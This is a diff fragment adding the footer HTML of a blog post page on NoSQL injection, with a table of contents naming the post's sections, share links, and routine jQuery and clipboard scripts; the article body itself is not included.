+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NoSQL%E6%B3%A8%E5%85%A5%E5%88%86%E7%B1%BB"><span class="toc-number">2.</span> <span class="toc-text">NoSQL注入分类</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php%E4%B8%AD%E7%9A%84NoSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">php中的NoSQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%87%8D%E8%A8%80%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">重言注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">3.2.</span> <span class="toc-text">联合查询注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JavaScript%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">JavaScript注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#where%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">3.3.1.</span> <span class="toc-text">where操作符</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Command%E6%96%B9%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.2.</span> <span class="toc-text">Command方法注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Node-js%E4%B8%AD%E7%9A%84NoSQL%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">Node.js中的NoSQL注入</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&text=NOSQL注入学习"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&title=NOSQL注入学习"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&is_video=false&description=NOSQL注入学习"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NOSQL注入学习&body=Check out this article: http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&title=NOSQL注入学习"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&title=NOSQL注入学习"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&title=NOSQL注入学习"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&title=NOSQL注入学习"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&name=NOSQL注入学习&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/06/29/nosql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/&t=NOSQL注入学习"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    blacsheep
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
